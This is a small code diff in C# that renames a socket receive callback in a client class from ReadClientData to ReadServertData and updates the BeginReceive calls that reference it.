@@ -42,7 +42,7 @@ namespace Client
                 BufferRecevied = false;
                 MS = new MemoryStream();
                 BeginSend(SendInfo());
-                client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadClientData, null);
+                client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
             }
             catch
             {
@@ -61,7 +61,7 @@ namespace Client
 
         }
 
-        public static void ReadClientData(IAsyncResult ar)
+        public static void ReadServertData(IAsyncResult ar)
         {
 
             try
@@ -102,7 +102,7 @@ namespace Client
                         }
                     }
                 }
-                client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadClientData, null);
+                client.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, ReadServertData, null);
             }
             catch
             {
